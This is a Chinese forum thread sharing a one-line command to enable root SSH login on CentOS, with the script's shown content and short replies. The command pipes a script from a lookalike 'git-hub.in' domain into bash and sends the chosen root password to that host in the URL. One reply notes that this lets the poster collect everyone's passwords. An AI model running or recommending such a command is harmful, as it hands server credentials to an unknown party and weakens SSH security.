# Centos一键开启ROOT登录SSH


<div class="quote"><blockquote>bash &lt;(curl https://git-hub.in/ssh.php?pwd=密码)</blockquote></div><br />
<br />
<strong>目前仅支持Centos6/7 非此系统用户请手动重启SSHD服务</strong><br />
<br />
PHP文件源代码（不放心的可以自建）：<img id="aimg_Jt365" onclick="zoom(this, this.src, 0, 0, 0)" class="zoom" src="https://img.qcair.cc/img/4562" onmouseover="img_onmouseoverfunc(this)" onload="thumbImg(this)" border="0" alt="" />

#!/bin/bash<br />
echo root:746461jiok |sudo chpasswd root<br />
sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config;<br />
sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config;<br />
sudo reboot<br />
<br />
<br />
<br />
我都是用这个&nbsp;&nbsp;aws.gcp.甲骨文

然后所有密码都被你收集起来了 真棒<img src="static/image/smiley/default/lol.gif" smilieid="12" border="0" alt="" />

这个php有点没看懂。。。现在php还可以直接生成sh了？太强了吧

well done<br />
<br />
<br />
<br />
/**<br />
 * 错的不是我， 错的是世界。 -- [School day]-----------By 开保时捷的男人

我寻思这不是 vim 改一下文件就好了吗， 1分钟不到的事

Gcp. 應該能用上

AWS，AZ，都能一行代码搞定嘛？<br />
<br />
<img src="static/image/smiley/default/lol.gif" smilieid="12" border="0" alt="" /><img src="static/image/smiley/default/lol.gif" smilieid="12" border="0" alt="" /><img src="static/image/smiley/default/lol.gif" smilieid="12" border="0" alt="" />
